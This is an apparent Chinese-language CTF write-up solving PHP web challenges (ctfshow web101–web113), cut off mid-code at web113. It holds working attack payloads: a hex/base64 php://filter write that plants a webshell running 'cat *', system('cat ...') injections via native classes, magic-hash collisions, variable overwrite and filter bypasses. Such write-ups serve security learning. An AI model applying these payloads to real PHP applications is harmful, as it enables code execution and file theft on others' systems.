-&lt;p&gt;php 语言是一种简单的同时可以应用面向对象面向过程方式的变成语言，而在面向对象中对象被赋予了自省的能力，这种自省的过程就是反射，在 php 文档中是这样介绍的 “ &lt;code&gt;PHP 具有完整的反射 API，增加了内省类、接口、函数、方法和扩展的能力。 此外，反射 API 提供了方法来取出函数、类和方法中的文档注释。&lt;/code&gt; ”，简单来说就是通过对象找到他所属的类，拥有哪些方法等等&lt;/p&gt;
-&lt;h3 id=&#34;demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#demo&#34;&gt;#&lt;/a&gt; demo&lt;/h3&gt;
-&lt;p&gt;对于反射会接触到四个类&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;ReflectionClass
-ReflectionFunction
-ReflectionMethod
-ReflectionParameter
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;接下来简单写一个 demo&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-class demo1&amp;#123;&amp;#125;
-class demo2&amp;#123;
-	public $test1;
-	private $test2;
-
-	public function __construct()&amp;#123;
-		$this-&amp;gt;test1 = &#39;test1&#39;;
-		$this-&amp;gt;test2 = &#39;test2&#39;;
-	&amp;#125;
-
-	public function functiontest()&amp;#123;
-		//echo $this-&amp;gt;test1;
-		return $this-&amp;gt;test2;
-	&amp;#125;
-&amp;#125;
-
-//$class=new ReflectionClass(demo2::class);
-$class = new ReflectionClass(&#39;demo2&#39;);
-//$funtion = new ReflectionMethod(&#39;demo2&#39;, &#39;__construct&#39;);
-//$Method = new ReflectionMethod(&#39;demo2&#39;, &#39;functiontest&#39;);
-//$Parameter = new ReflectionParameter(&#39;demo2&#39;, &#39;functiontest&#39;);
-echo $class;
-//echo $funtion;
-//echo $Method;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;运行结果如下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;Class [ &amp;lt;user&amp;gt; class demo2 ] &amp;#123;
-  - Constants [0] &amp;#123;
-  &amp;#125;
-
-  - Static properties [0] &amp;#123;
-  &amp;#125;
-
-  - Static methods [0] &amp;#123;
-  &amp;#125;
-
-  - Properties [2] &amp;#123;
-    Property [ &amp;lt;default&amp;gt; public $test1 ]
-    Property [ &amp;lt;default&amp;gt; private $test2 ]
-  &amp;#125;
-
-  - Methods [2] &amp;#123;
-    Method [ &amp;lt;user, ctor&amp;gt; public method __construct ] &amp;#123;
-      @@ C:\Users\Clown\Desktop\exp.php 7 - 10
-    &amp;#125;
-
-    Method [ &amp;lt;user&amp;gt; public method functiontest ] &amp;#123;
-      @@ C:\Users\Clown\Desktop\exp.php 12 - 15
-    &amp;#125;
-  &amp;#125;
-&amp;#125;
-
-[Done] exited with code=0 in 0.061 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;可以看到将类中的信息打印出来，所有 payload&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?v1=1&amp;amp;v2=echo new Reflectionclass&amp;amp;v3=;
-?v1=1&amp;amp;v2=echo new Reflectionclass?&amp;gt;&amp;amp;v3=;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102222148085.png&#34; alt=&#34;image-20230102222148085&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web102&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web102&#34;&gt;#&lt;/a&gt; web102&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
-highlight_file(__FILE__);
-$v1 = $_POST[&#39;v1&#39;];
-$v2 = $_GET[&#39;v2&#39;];
-$v3 = $_GET[&#39;v3&#39;];
-$v4 = is_numeric($v2) and is_numeric($v3);
-if($v4)&amp;#123;
-    $s = substr($v2,2);
-    $str = call_user_func($v1,$s);
-    echo $str;
-    file_put_contents($v3,$str);
-&amp;#125;
-else&amp;#123;
-    die(&#39;hacker&#39;);
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;题目本意应该是 php5 下 is_numeric 可识别 16 进制，如 0x2e，然后调用 hex2bin 转成字符串写入木马，但题目环境没配好，是 php7, 所以要另换方法&lt;/p&gt;
-&lt;p&gt;call_user_func () 这个函数是调用函数的一种方法&lt;/p&gt;
-&lt;p&gt;因为写入要用伪协议写入，所以需要 base64 编码后转成 16 进制全是数字的字符串，payload：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;get：?v2=115044383959474e6864434171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php
-post：v1=hex2bin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;接下来解释一下&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-$a=&#39;&amp;lt;?=`cat *`;&#39;;
-$b=base64_encode($a);
-echo $b;  // PD89YGNhdCAqYDs=
-$c=bin2hex(&#39;PD89YGNhdCAqYDs&#39;);
-echo $c;    //5044383959474e6864434171594473
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230102231612343.png&#34; alt=&#34;image-20230102231612343&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web103&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web103&#34;&gt;#&lt;/a&gt; web103&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-$v1 = $_POST[&#39;v1&#39;];
-$v2 = $_GET[&#39;v2&#39;];
-$v3 = $_GET[&#39;v3&#39;];
-$v4 = is_numeric($v2) and is_numeric($v3);
-if($v4)&amp;#123;
-    $s = substr($v2,2);
-    $str = call_user_func($v1,$s);
-    echo $str;
-    if(!preg_match(&amp;quot;/.*p.*h.*p.*/i&amp;quot;,$str))&amp;#123;
-        file_put_contents($v3,$str);
-    &amp;#125;
-    else&amp;#123;
-        die(&#39;Sorry&#39;);
-    &amp;#125;
-&amp;#125;
-else&amp;#123;
-    die(&#39;hacker&#39;);
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;比起上一关多了一个正则，但是不影响做题&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-payload&#34;&gt;get：?v2=115044383959474e6864434171594473&amp;amp;v3=php://filter/write=convert.base64-decode/resource=1.php
-post：v1=hex2bin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web104&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web104&#34;&gt;#&lt;/a&gt; web104&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-if(isset($_POST[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
-    $v1 = $_POST[&#39;v1&#39;];
-    $v2 = $_GET[&#39;v2&#39;];
-    if(sha1($v1)==sha1($v2))&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;弱类型比较，找两个 sha1 后为数字加 e 开头的，这里&lt;/p&gt;
-&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;10932435112: 0e07766915004133176347055865026311692244&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaroZmOk: 0e66507019969427134894567494305185566735&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaK1STfY: 0e76658526655756207688271159624026011393&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aaO8zKZF: 0e89257456677279068558073954252716165668&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;aa3OFF9m: 0e36977786278517984959260394024281014729&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e1290633704: 0e19985187802402577070739524195726831799&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;当然，简单一点可以直接用数组绕过&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111104256845.png&#34; alt=&#34;image-20230111104256845&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web105&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web105&#34;&gt;#&lt;/a&gt; web105&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&#39;flag.php&#39;);
-error_reporting(0);
-$error=&#39;你还想要flag嘛？&#39;;
-$suces=&#39;既然你想要那给你吧！&#39;;
-foreach($_GET as $key =&amp;gt; $value)&amp;#123;
-    if($key===&#39;error&#39;)&amp;#123;
-        die(&amp;quot;what are you doing?!&amp;quot;);
-    &amp;#125;
-    $$key=$$value;
-&amp;#125;foreach($_POST as $key =&amp;gt; $value)&amp;#123;
-    if($value===&#39;flag&#39;)&amp;#123;
-        die(&amp;quot;what are you doing?!&amp;quot;);
-    &amp;#125;
-    $$key=$$value;
-&amp;#125;
-if(!($_POST[&#39;flag&#39;]==$flag))&amp;#123;
-    die($error);
-&amp;#125;
-echo &amp;quot;your are good&amp;quot;.$flag.&amp;quot;\n&amp;quot;;
-die($suces);
-
-?&amp;gt;
-你还想要flag嘛？
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个题的关键在于两个下面的语句，实现变量覆盖&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php、&#34;&gt;$$key=$$value;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;我们的目标 flag 在 $flag 中，想要获得中国 flag 我们要么到最后一步&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;echo &amp;quot;your are good&amp;quot;.$flag.&amp;quot;\n&amp;quot;; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;因为有上面提到的哪个关键语句在，这里可以通过变量覆盖实现，于是 payload 的思路就是先用第一个 if 的 get 将 flag 的值赋值给 suces，再用第二个 if，将 suces 的值给 error，再通过下面的语句会将 error 输出&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if(!($_POST[&#39;flag&#39;]==$flag))&amp;#123;
-    die($error); 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;所以 payload&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;?suces=flag
-post：error=suces
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h2 id=&#34;web106&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web106&#34;&gt;#&lt;/a&gt; web106&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-include(&amp;quot;flag.php&amp;quot;);
-
-if(isset($_POST[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
-    $v1 = $_POST[&#39;v1&#39;];
-    $v2 = $_GET[&#39;v2&#39;];
-    if(sha1($v1)==sha1($v2) &amp;amp;&amp;amp; $v1!=$v2)&amp;#123;
-        echo $flag;
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;为啥不和 104 放一块呢？？？好多问号&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111111704069.png&#34; alt=&#34;image-20230111111704069&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web107&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web107&#34;&gt;#&lt;/a&gt; web107&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-
-if(isset($_POST[&#39;v1&#39;]))&amp;#123;
-    $v1 = $_POST[&#39;v1&#39;];
-    $v3 = $_GET[&#39;v3&#39;];
-       parse_str($v1,$v2);
-       if($v2[&#39;flag&#39;]==md5($v3))&amp;#123;
-           echo $flag;
-       &amp;#125;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;parse_str () 函数把查询字符串解析到变量中。&lt;/p&gt;
-&lt;p&gt;未设置 &lt;em&gt;array&lt;/em&gt; 参数，则由该函数设置的变量将覆盖已存在的同名变量&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-parse_str(&amp;quot;name=Bill&amp;amp;age=60&amp;quot;);
-echo $name.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
-echo $age;
-?&amp;gt;
-//Bill
-//60
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;设置了 array 参数&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-parse_str(&amp;quot;name=Bill&amp;amp;age=60&amp;quot;,$myArray);
-print_r($myArray);
-?&amp;gt;
-// Array ( [name] =&amp;gt; Bill [age] =&amp;gt; 60 )
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;将 v3 的参 md5 后与 flag 相比较，下面提供一组 md 后 0e 开头的字符串&lt;/p&gt;
-&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;QNKCDZO&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e830400451993494058024219903391&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;240610708&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e462097431906509019562988736854&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s878926199a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e545993274517709034328855841020&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s155964671a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e342768416822451524974117254469&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s214587387a&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0e848240448830537924465865611904&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111144939145.png&#34; alt=&#34;image-20230111144939145&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web108&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web108&#34;&gt;#&lt;/a&gt; web108&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-
-if (ereg (&amp;quot;^[a-zA-Z]+$&amp;quot;, $_GET[&#39;c&#39;])===FALSE)  &amp;#123;
-    die(&#39;error&#39;);
-&amp;#125;
-//只有36d的人才能看到flag
-if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&amp;#123;
-    echo $flag;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;首先还是介绍几个函数&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;ereg()&lt;/code&gt;  函数搜索由指定的字符串作为由模式指定的字符串，如果发现模式则返回 &lt;code&gt;true&lt;/code&gt; ，否则返回 &lt;code&gt;false&lt;/code&gt; 。搜索对于字母字符是区分大小写的。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;intval()&lt;/code&gt;  函数用于获取变量的整数值。&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;strrev()&lt;/code&gt;  函数反转字符串。&lt;/p&gt;
-&lt;p&gt;再这里 ereg 函数存在一个 00null 的截断&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230111173919413.png&#34; alt=&#34;image-20230111173919413&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web109&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web109&#34;&gt;#&lt;/a&gt; web109&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
-    $v1 = $_GET[&#39;v1&#39;];
-    $v2 = $_GET[&#39;v2&#39;];
-    if(preg_match(&#39;/[a-zA-Z]+/&#39;, $v1) &amp;amp;&amp;amp; preg_match(&#39;/[a-zA-Z]+/&#39;, $v2))&amp;#123;
-            eval(&amp;quot;echo new $v1($v2());&amp;quot;);
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个很明显是考察原生类利用，这里可以查阅&lt;a href=&#34;https://blog.xcu.icu/2022/11/02/php%E5%BA%8F%E5%88%97%E5%8C%96/&#34;&gt; php 反序列化 - Web | Clown の Blog = (xcu.icu)&lt;/a&gt; 我的这篇文章&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;echo new $v1($v2());
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里 echo 一个实例化的对象 v1，v2 是传入类中的参数，这里 v2 () 是表示会将 v2 返回值作为函数调用，这里有 echo 可以自动调用魔术方法__tostring () 方法，那么这里几个 php 反射类，和异常处理类等等都可以利用&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;v1=Exception&amp;amp;v2=system(&#39;cat fl36dg.txt&#39;) v1=Reflectionclass&amp;amp;v2=system(&#39;cat fl36dg.txt&#39;)
-v1=mysqli&amp;amp;v2=system(&#39;tac fl36dg.txt&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113120837704.png&#34; alt=&#34;image-20230113120837704&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web110&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web110&#34;&gt;#&lt;/a&gt; web110&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
-    $v1 = $_GET[&#39;v1&#39;];
-    $v2 = $_GET[&#39;v2&#39;];
-
-    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v1))&amp;#123;
-            die(&amp;quot;error v1&amp;quot;);
-    &amp;#125;
-    if(preg_match(&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;, $v2))&amp;#123;
-            die(&amp;quot;error v2&amp;quot;);
-    &amp;#125;
-    eval(&amp;quot;echo new $v1($v2());&amp;quot;);
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这个题比起上一题加了一些过滤，上面的方法就不在使用，首先要查看文件明&lt;/p&gt;
-&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;可遍历目录类有以下几个：&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;DirectoryIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;FilesystemIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;GlobIterator 类&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;但是这些都要传入路径，这里符号都被过滤，所以要使用别的函数来获取路径&lt;/p&gt;
-&lt;p&gt;如果要获取脚本文件的目录，要应用函数 getcwd () 来实现。函数声明如下：&lt;/p&gt;
-&lt;p&gt;string getcwd ( void ) ;&lt;/p&gt;
-&lt;p&gt;成功执行后返回当前目录字符串，失败返回 FALSE。&lt;/p&gt;
-&lt;p&gt;注： &lt;code&gt;这里三个遍历目录类，第一个包含隐藏文件，第二个不包含，第三个获取的是目录名，所以这里要使用第二个，当然这种方法也只能获取第一个文件名&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122221136.png&#34; alt=&#34;image-20230113122221136&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;访问即可&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113122354782.png&#34; alt=&#34;image-20230113122354782&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;中篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#中篇&#34;&gt;#&lt;/a&gt; 中篇&lt;/h1&gt;
-&lt;h2 id=&#34;web111&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web111&#34;&gt;#&lt;/a&gt; web111&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-include(&amp;quot;flag.php&amp;quot;);
-function getFlag(&amp;amp;$v1,&amp;amp;$v2)&amp;#123;
-    eval(&amp;quot;$$v1 = &amp;amp;$$v2;&amp;quot;);
-    var_dump($$v1);
-&amp;#125;
-if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]))&amp;#123;
-    $v1 = $_GET[&#39;v1&#39;];
-    $v2 = $_GET[&#39;v2&#39;];
-    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&#39;, $v1))&amp;#123;
-            die(&amp;quot;error v1&amp;quot;);
-    &amp;#125;
-    if(preg_match(&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;amp;|\*|\(|\)|\_|\-|\+|\=|\&amp;#123;|\[|\;|\:|\&amp;quot;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&amp;lt;|\&amp;gt;/&#39;, $v2))&amp;#123;
-            die(&amp;quot;error v2&amp;quot;);
-    &amp;#125;
-    if(preg_match(&#39;/ctfshow/&#39;, $v1))&amp;#123;
-            getFlag($v1,$v2);
-    &amp;#125;
-&amp;#125;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;本题的重点在&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;    eval(&amp;quot;$$v1 = &amp;amp;$$v2;&amp;quot;);
-    var_dump($$v1);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;很明显考察变量覆盖，这里使用 GLOBALS 全局变量&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230113204217572.png&#34; alt=&#34;image-20230113204217572&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;web112&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web112&#34;&gt;#&lt;/a&gt; web112&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-function filter($file)&amp;#123;   if(preg_match(&#39;/\.\.\/|http|https|data|input|rot13|base64|string/i&#39;,$file))&amp;#123;
-        die(&amp;quot;hacker!&amp;quot;);
-    &amp;#125;else&amp;#123;
-        return $file;
-    &amp;#125;
-&amp;#125;
-$file=$_GET[&#39;file&#39;];
-if(! is_file($file))&amp;#123;
-    highlight_file(filter($file));
-&amp;#125;else&amp;#123;
-    echo &amp;quot;hacker!&amp;quot;;
-&amp;#125;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里我们的目的是不能让 is_file 检测出是文件，并且 highlight_file 可以识别为文件。这时候可以利用 php 伪协议。&lt;br /&gt;
-可以直接用不带任何过滤器的 filter 伪协议&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;php://filter/resource=flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里主要是为了过滤编码方式，采用为被过滤的编码方式即可&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
-php://filter/read=convert.quoted-printable-encode/resource=flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;或者使用别的伪协议&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-url&#34;&gt;compress.zlib://flag.php
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里对 zip 伪协议进行一个补充&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;【zip:// 协议】&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;zip://archive.zip#dir/file.txt&lt;/p&gt;
-&lt;p&gt;zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2.【bzip2:// 协议】&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;compress.bzip2://file.bz2&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3.【zlib:// 协议】&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;使用方法：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;compress.zlib://file.gz&lt;/p&gt;
-&lt;h2 id=&#34;web113&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web113&#34;&gt;#&lt;/a&gt; web113&lt;/h2&gt;
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-highlight_file(__FILE__);
-error_reporting(0);
-function filter($file)&amp;#123;
